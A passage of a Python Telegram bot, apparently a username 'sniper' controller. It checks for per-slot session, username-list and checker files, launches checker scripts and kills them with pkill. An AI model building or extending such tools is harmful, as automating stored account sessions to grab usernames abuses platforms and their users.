                        wgq3773jflkffjhs = 'page_run_check_num_10'
                    else:
                        wgq3773jflkffjhs = 'page_pass'
                    wgq3773jflkffjhs = str(wgq3773jflkffjhs)
                    if os.path.exists('session_num_11.txt') and os.path.exists('users_num_11.txt') and os.path.exists('checker_num_11.py'):
                        hdjsp28fjjf = 'Available ✅'
                    else:
                        hdjsp28fjjf = 'Not found ❎'
                    hdjsp28fjjf = str(hdjsp28fjjf)
                    if str(hdjsp28fjjf) == 'Available ✅':
                        pdfjh636idjxdhcb = 'page_run_check_num_11'
                    else:
                        pdfjh636idjxdhcb = 'page_pass'
                    pdfjh636idjxdhcb = str(pdfjh636idjxdhcb)
                    if os.path.exists('session_num_12.txt') and os.path.exists('users_num_12.txt') and os.path.exists('checker_num_12.py'):
                        dhhdye37ndj = 'Available ✅'
                    else:
                        dhhdye37ndj = 'Not found ❎'
                    dhhdye37ndj = str(dhhdye37ndj)
                    if str(dhhdye37ndj) == 'Available ✅':
                        gqi730337wmdhxh = 'page_run_check_num_12'
                    else:
                        gqi730337wmdhxh = 'page_pass'
                    gqi730337wmdhxh = str(gqi730337wmdhxh)
                    if os.path.exists('session_num_13.txt') and os.path.exists('users_num_13.txt') and os.path.exists('checker_num_13.py'):
                        dhksja377bdbd = 'Available ✅'
                    else:
                        dhksja377bdbd = 'Not found ❎'
                    dhksja377bdbd = str(dhksja377bdbd)
                    if str(dhksja377bdbd) == 'Available ✅':
                        qipd638hdbsg = 'page_run_check_num_13'
                    else:
                        qipd638hdbsg = 'page_pass'
                    qipd638hdbsg = str(qipd638hdbsg)
                    if os.path.exists('session_num_14.txt') and os.path.exists('users_num_14.txt') and os.path.exists('checker_num_14.py'):
                        epfk37dhfk = 'Available ✅'
                    else:
                        epfk37dhfk = 'Not found ❎'
                    epfk37dhfk = str(epfk37dhfk)
                    if str(epfk37dhfk) == 'Available ✅':
                        pak63817dnxbhs = 'page_run_check_num_14'
                    else:
                        pak63817dnxbhs = 'page_pass'
                    pak63817dnxbhs = str(pak63817dnxbhs)
                    if os.path.exists('session_num_15.txt') and os.path.exists('users_num_15.txt') and os.path.exists('checker_num_15.py'):
                        s377pddndnkj = 'Available ✅'
                    else:
                        s377pddndnkj = 'Not found ❎'
                    s377pddndnkj = str(s377pddndnkj)
                    if str(s377pddndnkj) == 'Available ✅':
                        laid2782ncbag = 'page_run_check_num_15'
                    else:
                        laid2782ncbag = 'page_pass'
                    laid2782ncbag = str(laid2782ncbag)
                    if os.path.exists('session_num_16.txt') and os.path.exists('users_num_16.txt') and os.path.exists('checker_num_16.py'):
                        dkelu367ndjf = 'Available ✅'
                    else:
                        dkelu367ndjf = 'Not found ❎'
                    dkelu367ndjf = str(dkelu367ndjf)
                    if str(dkelu367ndjf) == 'Available ✅':
                        ap638kdjxb = 'page_run_check_num_16'
                    else:
                        ap638kdjxb = 'page_pass'
                    ap638kdjxb = str(ap638kdjxb)
                    if os.path.exists('session_num_17.txt') and os.path.exists('users_num_17.txt') and os.path.exists('checker_num_17.py'):
                        wyeu3636kdkf = 'Available ✅'
                    else:
                        wyeu3636kdkf = 'Not found ❎'
                    wyeu3636kdkf = str(wyeu3636kdkf)
                    if str(wyeu3636kdkf) == 'Available ✅':
                        hdp636sjwhs = 'page_run_check_num_17'
                    else:
                        hdp636sjwhs = 'page_pass'
                    hdp636sjwhs = str(hdp636sjwhs)
                    if os.path.exists('session_num_18.txt') and os.path.exists('users_num_18.txt') and os.path.exists('checker_num_18.py'):
                        dheo366hdjf = 'Available ✅'
                    else:
                        dheo366hdjf = 'Not found ❎'
                    dheo366hdjf = str(dheo366hdjf)
                    if str(dheo366hdjf) == 'Available ✅':
                        pajdb7383dbwg = 'page_run_check_num_18'
                    else:
                        pajdb7383dbwg = 'page_pass'
                    pajdb7383dbwg = str(pajdb7383dbwg)
                    if os.path.exists('session_num_19.txt') and os.path.exists('users_num_19.txt') and os.path.exists('checker_num_19.py'):
                        hdkdkej637 = 'Available ✅'
                    else:
                        hdkdkej637 = 'Not found ❎'
                    hdkdkej637 = str(hdkdkej637)
                    if str(hdkdkej637) == 'Available ✅':
                        pspfjfn637difu = 'page_run_check_num_19'
                    else:
                        pspfjfn637difu = 'page_pass'
                    pspfjfn637difu = str(pspfjfn637difu)
                    if os.path.exists('session_num_20.txt') and os.path.exists('users_num_20.txt') and os.path.exists('checker_num_20.py'):
                        wlld377jdghdjs = 'Available ✅'
                    else:
                        wlld377jdghdjs = 'Not found ❎'
                    wlld377jdghdjs = str(wlld377jdghdjs)
                    if str(wlld377jdghdjs) == 'Available ✅':
                        lap2930dnxbsb = 'page_run_check_num_20'
                    else:
                        lap2930dnxbsb = 'page_pass'
                    lap2930dnxbsb = str(lap2930dnxbsb)
                    keyboard0 = types.InlineKeyboardMarkup(row_width=2)
                    button01 = types.InlineKeyboardButton(text='Number 👇',callback_data='page_pass')
                    button02 = types.InlineKeyboardButton(text='The status of usernames 👇',callback_data='page_pass')
                    button03 = types.InlineKeyboardButton(text='1-: ',callback_data='page_pass')
                    button04 = types.InlineKeyboardButton(text=str(dhj27djdhsjs),callback_data=str(dbj637djdh))
                    button05 = types.InlineKeyboardButton(text='2-: ',callback_data='page_pass')
                    button06 = types.InlineKeyboardButton(text=str(dhkdjs737hdh),callback_data=str(kxkdos737))
                    button07 = types.InlineKeyboardButton(text='3-: ',callback_data='page_pass')
                    button08 = types.InlineKeyboardButton(text=str(dhek377hdhd),callback_data=str(bdisjhs637djjd))
                    button09 = types.InlineKeyboardButton(text='4-: ',callback_data='page_pass')
                    button10 = types.InlineKeyboardButton(text=str(hdkdjsb73bfb),callback_data=str(djd377bdjdjc))
                    button11 = types.InlineKeyboardButton(text='5-: ',callback_data='page_pass')
                    button12 = types.InlineKeyboardButton(text=str(dhis278akls),callback_data=str(dnsi377udjd))
                    button13 = types.InlineKeyboardButton(text='6-: ',callback_data='page_pass')
                    button14 = types.InlineKeyboardButton(text=str(jeks20bdbf),callback_data=str(hdjsj367bxjcj))
                    button15 = types.InlineKeyboardButton(text='7-: ',callback_data='page_pass')
                    button16 = types.InlineKeyboardButton(text=str(dhsolapell737),callback_data=str(djiehdh377kdkdjc))
                    button17 = types.InlineKeyboardButton(text='8-: ',callback_data='page_pass')
                    button18 = types.InlineKeyboardButton(text=str(dhdkjs377hdh),callback_data=str(hdidjteu367jxjc))
                    button19 = types.InlineKeyboardButton(text='9-: ',callback_data='page_pass')
                    button20 = types.InlineKeyboardButton(text=str(dheisoks363),callback_data=str(ehirnfh636ndnf))
                    button21 = types.InlineKeyboardButton(text='10-: ',callback_data='page_pass')
                    button22 = types.InlineKeyboardButton(text=str(dhs27dbfjj),callback_data=str(wgq3773jflkffjhs))
                    button23 = types.InlineKeyboardButton(text='11-: ',callback_data='page_pass')
                    button24 = types.InlineKeyboardButton(text=str(hdjsp28fjjf),callback_data=str(pdfjh636idjxdhcb))
                    button25 = types.InlineKeyboardButton(text='12-: ',callback_data='page_pass')
                    button26 = types.InlineKeyboardButton(text=str(dhhdye37ndj),callback_data=str(gqi730337wmdhxh))
                    button27 = types.InlineKeyboardButton(text='13-: ',callback_data='page_pass')
                    button28 = types.InlineKeyboardButton(text=str(dhksja377bdbd),callback_data=str(qipd638hdbsg))
                    button29 = types.InlineKeyboardButton(text='14-: ',callback_data='page_pass')
                    button30 = types.InlineKeyboardButton(text=str(epfk37dhfk),callback_data=str(pak63817dnxbhs))
                    button31 = types.InlineKeyboardButton(text='15-: ',callback_data='page_pass')
                    button32 = types.InlineKeyboardButton(text=str(s377pddndnkj),callback_data=str(laid2782ncbag))
                    button33 = types.InlineKeyboardButton(text='16-: ',callback_data='page_pass')
                    button34 = types.InlineKeyboardButton(text=str(dkelu367ndjf),callback_data=str(ap638kdjxb))
                    button35 = types.InlineKeyboardButton(text='17-: ',callback_data='page_pass')
                    button36 = types.InlineKeyboardButton(text=str(wyeu3636kdkf),callback_data=str(hdp636sjwhs))
                    button37 = types.InlineKeyboardButton(text='18-: ',callback_data='page_pass')
                    button38 = types.InlineKeyboardButton(text=str(dheo366hdjf),callback_data=str(pajdb7383dbwg))
                    button39 = types.InlineKeyboardButton(text='19-: ',callback_data='page_pass')
                    button40 = types.InlineKeyboardButton(text=str(hdkdkej637),callback_data=str(pspfjfn637difu))
                    button41 = types.InlineKeyboardButton(text='20-: ',callback_data='page_pass')
                    button42 = types.InlineKeyboardButton(text=str(wlld377jdghdjs),callback_data=str(lap2930dnxbsb))
                    button43 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                    keyboard0.add(button01,button02,button03,button04,button05,button06,button07,button08,button09,button10,button11,button12,button13,button14,button15,button16,button17,button18,button19,button20,button21,button22,button23,button24,button25,button26,button27,button28,button29,button30,button31,button32,button33,button34,button35,button36,button37,button38,button39,button40,button41,button42,button43)
                    bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='Choose what you want 👇',reply_markup=keyboard0)

            elif ('page_run_check_num_') in str(data):
                ghkhkjo = str(data).split('page_run_check_num_')[1]
                if os.path.exists('session_num_'+str(ghkhkjo)+'.txt') and os.path.exists('users_num_'+str(ghkhkjo)+'.txt') and os.path.exists('checker_num_'+str(ghkhkjo)+'.py'):
                    for _ in range(10):
                        os.system('pkill -f assistant.py')
                        os.system('pkill -f checker_num_'+str(ghkhkjo)+'.py')
                    def run_script(script_name):
                        subprocess.run(['python3', script_name])
                    if __name__ == '__main__':
                        scripts = ['checker_num_'+str(ghkhkjo)+'.py','assistant.py']
                        processes = []
                        for script in scripts:
                            process = multiprocessing.Process(target=run_script, args=(script,))
                            processes.append(process)
                            process.start()
                        for process in processes:
                            process.join()
                else:
                    keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                    button01 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                    keyboard0.add(button01)
                    bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='The checker cannot be run because there is no session code or usernames',reply_markup=keyboard0)

            elif str(data) == 'page_turn_off_scanning':
                for _ in range(10):
                    os.system('pkill -f get_info.py')
                    os.system('pkill -f t.py')
                    os.system('pkill -f assistant.py')
                    os.system('pkill -f checker_num_1.py')
                    os.system('pkill -f checker_num_2.py')
                    os.system('pkill -f checker_num_3.py')
                    os.system('pkill -f checker_num_4.py')
                    os.system('pkill -f checker_num_5.py')
                    os.system('pkill -f checker_num_6.py')
                    os.system('pkill -f checker_num_7.py')
                    os.system('pkill -f checker_num_8.py')
                    os.system('pkill -f checker_num_9.py')
                    os.system('pkill -f checker_num_10.py')
                    os.system('pkill -f checker_num_11.py')
                    os.system('pkill -f checker_num_12.py')
                    os.system('pkill -f checker_num_13.py')
                    os.system('pkill -f checker_num_14.py')
                    os.system('pkill -f checker_num_15.py')
                    os.system('pkill -f checker_num_16.py')
                    os.system('pkill -f checker_num_17.py')
                    os.system('pkill -f checker_num_18.py')
                    os.system('pkill -f checker_num_19.py')
                    os.system('pkill -f checker_num_20.py')
                keyboard0 = types.InlineKeyboardMarkup(row_width=1)
                button01 = types.InlineKeyboardButton(text='Back to the main page',callback_data='page_main')
                keyboard0.add(button01)
                bot.edit_message_text(chat_id=chat_id,message_id=message_id,text='All checkers have been stopped',reply_markup=keyboard0)

            elif str(data) == 'page_pass':
                pass

    print('[√] BoT IS RunninG | SNIPER HEX')
    bot.infinity_polling()
except Exception as errors:
    if ('HTTPSConnectionPool(host=') in str(errors) or ('Connection aborted.') in str(errors):
        pass
    else:
        get(url='https://api.telegram.org/bot'+str(bot_token)+'/sendmessage?chat_id='+str(id_dev)+'&text='+str(errors))
